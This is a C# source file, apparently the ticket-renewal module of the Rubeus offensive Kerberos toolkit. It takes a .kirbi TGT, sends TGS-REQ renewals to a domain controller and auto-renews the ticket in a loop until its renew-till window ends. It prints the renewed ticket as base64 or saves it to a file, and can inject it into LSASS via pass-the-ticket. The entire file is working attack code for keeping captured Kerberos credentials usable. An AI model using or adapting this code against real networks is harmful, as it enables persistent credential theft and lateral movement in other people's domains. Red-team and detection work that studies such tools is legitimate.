using System;
using System.IO;
using System.Linq;
using Asn1;
using Rubeus.lib.Interop;


namespace Rubeus
{
    public class Renew
    {
        public static void TGTAutoRenew(KRB_CRED kirbi, string domainController = "", bool display = true)
        {
            KRB_CRED currentKirbi = kirbi;

            while (true)
            {
                // extract out the info needed for the TGS-REQ/AP-REQ renewal
                string userName = currentKirbi.enc_part.ticket_info[0].pname.name_string[0];
                string domain = currentKirbi.enc_part.ticket_info[0].prealm;
                Console.WriteLine("\r\n\r\n[*] User       : {0}@{1}", userName, domain);

                DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(currentKirbi.enc_part.ticket_info[0].endtime);
                DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(currentKirbi.enc_part.ticket_info[0].renew_till);
                Console.WriteLine("[*] endtime    : {0}", endTime);
                Console.WriteLine("[*] renew-till : {0}", renewTill);

                if (endTime > renewTill)
                {
                    Console.WriteLine("\r\n[*] renew-till window ({0}) has passed.\r\n", renewTill);
                    return;
                }
                else
                {
                    double ticks = (endTime - DateTime.Now).Ticks;
                    if (ticks < 0)
                    {
                        Console.WriteLine("\r\n[*] endtime is ({0}) has passed, no renewal possible.\r\n", endTime);
                        return;
                    }

                    // get the window to sleep until the next endtime for the ticket, -30 minutes for a window
                    double sleepMinutes = TimeSpan.FromTicks((endTime - DateTime.Now).Ticks).TotalMinutes - 30;

                    Console.WriteLine("[*] Sleeping for {0} minutes (endTime-30) before the next renewal", (int)sleepMinutes);
                    System.Threading.Thread.Sleep((int)sleepMinutes * 60 * 1000);

                    Console.WriteLine("[*] Renewing TGT for {0}@{1}\r\n", userName, domain);
                    byte[] bytes = TGT(currentKirbi, null, false, domainController, true);
                    currentKirbi = new KRB_CRED(bytes);
                }
            }
        }

        public static byte[] TGT(KRB_CRED kirbi, string outfile = "", bool ptt = false, string domainController = "", bool display = true)
        {
            // extract out the info needed for the TGS-REQ/AP-REQ renewal
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            // request the new TGT renewal
            return TGT(userName, domain, ticket, clientKey, etype, outfile, ptt, domainController, display);
        }

        public static byte[] TGT(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", bool display = true)
        {
            string dcIP = Networking.GetDCIP(domainController, display);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            if (display)
            {
                Console.WriteLine("[*] Building TGS-REQ renewal for: '{0}\\{1}'", domain, userName);
            }

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, "krbtgt", providedTicket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, true, "");

            byte[] response = Networking.SendBytes(dcIP.ToString(), 88, tgsBytes);
            if(response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 13)
            {
                Console.WriteLine("[+] TGT renewal request successful!");

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);

                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                byte[] outBytes = Crypto.KerberosDecrypt(etype, 8, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (display)
                {
                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
                    if (Rubeus.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", kirbiString);
                    }
                }

                if (!String.IsNullOrEmpty(outfile))
                {
                    outfile = Helpers.MakeValidFileName(outfile);
                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                    {
                        if (display)
                        {
                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                        }
                    }
                }

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }
                return kirbiBytes;
            }
            else if (responseTag == 30)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }
    }
}